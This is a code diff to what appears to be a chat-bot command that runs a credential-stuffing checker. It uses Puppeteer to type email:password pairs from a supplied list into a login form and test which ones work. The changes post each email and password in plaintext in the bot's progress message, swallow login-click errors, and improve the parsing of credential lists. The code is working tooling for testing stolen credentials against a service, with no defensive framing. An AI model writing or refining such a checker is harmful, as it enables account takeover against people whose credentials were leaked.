@@ -47,7 +47,7 @@ const checkCredentials = async (
       msg.edit(
         `Checking... (${index + 1}/${
           credentials.length
-        })\nError: ${error_count}\nMessage: ${error_message}`
+        })\n${email}:${password}\nError: ${error_count}\nMessage: \`${error_message}\``
       );
 
       const page = await browser.newPage();
@@ -63,7 +63,12 @@ const checkCredentials = async (
       await page.keyboard.type(email);
       await page.focus("input[id=login-password]");
       await page.keyboard.type(password);
-      await page.click("button[id=login-button]");
+      try {
+        await page.waitFor(100);
+        await page.click("button[id=login-button]");
+      } catch (err) {
+        // do nothing
+      }
       await page.waitFor(3000);
 
       const isValid = await page.evaluate(() => {
@@ -126,7 +131,12 @@ module.exports = {
     const textResult = await getCredentials(args[0]);
     const credentials = textResult
       .split("\n")
-      .map(cred => cred.includes("@") && cred.substring(0, cred.indexOf(" ")))
+      .map(cred => {
+        const thereIsSpace = cred.indexOf(" ") === -1;
+        const lastIndex = thereIsSpace ? cred.length : cred.indexOf(" ");
+
+        return cred.includes("@") && cred.substring(0, lastIndex);
+      })
       .filter(val => !!val);
 
     const browser = await puppeteer.launch(puppeteerOptions);
